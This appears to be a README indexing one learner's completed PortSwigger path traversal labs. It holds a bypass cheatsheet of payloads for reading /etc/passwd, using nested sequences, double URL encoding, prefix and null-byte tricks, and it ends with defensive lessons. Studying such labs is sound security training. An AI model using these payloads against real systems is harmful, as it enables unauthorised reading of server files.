# Path Traversal — PortSwigger Labs

> [Web Security Academy — Path Traversal](https://portswigger.net/web-security/file-path-traversal)

## Progress

```
██████████████████  6 / 6 — 100%
```

| Difficulty | Completed |
|---|---|
| 🟢 Apprentice | 1 / 1 |
| 🟡 Practitioner | 5 / 5 |

---

## Labs

| # | Lab | Technique | Status |
|---|---|---|---|
| 01 | [Simple case](./writeups/01-simple-case.md) | Basic traversal | ✅ |
| 02 | [Absolute path bypass](./writeups/02-absolute-path-bypass.md) | Absolute path | ✅ |
| 03 | [Sequences stripped non-recursively](./writeups/03-sequences-stripped-non-recursively.md) | Nested sequences | ✅ |
| 04 | [Superfluous URL decode](./writeups/04-superfluous-url-decode.md) | Double URL encoding | ✅ |
| 05 | [Validation of start of path](./writeups/05-validate-start-of-path.md) | Prefix bypass | ✅ |
| 06 | [Null byte bypass](./writeups/06-null-byte-bypass.md) | Null byte | ✅ |

---

## Bypass cheatsheet

| Filter | Bypass | Payload |
|---|---|---|
| No filter | Direct traversal | `../../../etc/passwd` |
| Blocks `../` | Absolute path | `/etc/passwd` |
| Strips `../` once | Nested sequences | `....//....//....//etc/passwd` |
| Decodes URL once | Double URL encoding | `..%252f..%252f..%252fetc/passwd` |
| Validates path start | Prefix + traversal | `/var/www/images/../../../etc/passwd` |
| Validates extension | Null byte | `../../../etc/passwd%00.png` |

---

## Key concepts learned

- Every filter bypass targets a different assumption the developer made about the input
- Blacklists are always bypassable — the correct defense is `realpath()` + prefix check on the resolved path
- Null byte attacks exploit the difference between how the app and the OS handle string termination
